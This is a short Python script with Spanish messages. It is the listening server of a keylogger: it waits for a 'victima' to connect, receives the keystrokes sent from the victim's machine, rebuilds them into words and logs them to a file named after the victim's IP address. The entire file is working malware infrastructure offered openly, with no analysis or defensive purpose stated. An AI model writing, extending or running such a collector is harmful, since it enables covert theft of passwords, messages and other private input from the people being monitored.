import socket
try:
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            data=""
            s.bind(('192.168.18.127', 9080))
            s.listen()
            print("[+] A la espera de la victima! ")
            try:
                while True:
                    session, addr = s.accept()
                    print(f"[+] Conexion recibida de la ip {addr}")
                    frase=""
                    while True:
                            newdata = session.recv(1024).decode()
                            if newdata != data:
                                if newdata == 'Key.space' or newdata=='Key.enter':
                                    file = open(addr[0], "a+")
                                    frase+= " "
                                    newdata=data
                                    print(f"\n{frase}")
                                    file.write(F"\n{frase}")
                                    file.close()
                                    frase=""
                                        
                                elif newdata in ['Key.shift', 'Key.ctrl_l', 'Key.alt_gr', 'Key.cmd', 'Key.Tab']:
                                    continue
                                elif newdata == 'Key.backspace':
                                    frase+=("-Borrar-")
                                    print("\n-Borrar-")
                                    continue
                                else:
                                    frase+=newdata[1]
                                    newdata=data
                                    continue
            except Exception:
                print("Conexion perdida! ")
                session.close()
except KeyboardInterrupt:
    session.close()
    s.close()
    print("Cerrando el servidor!")
    exit()     
                
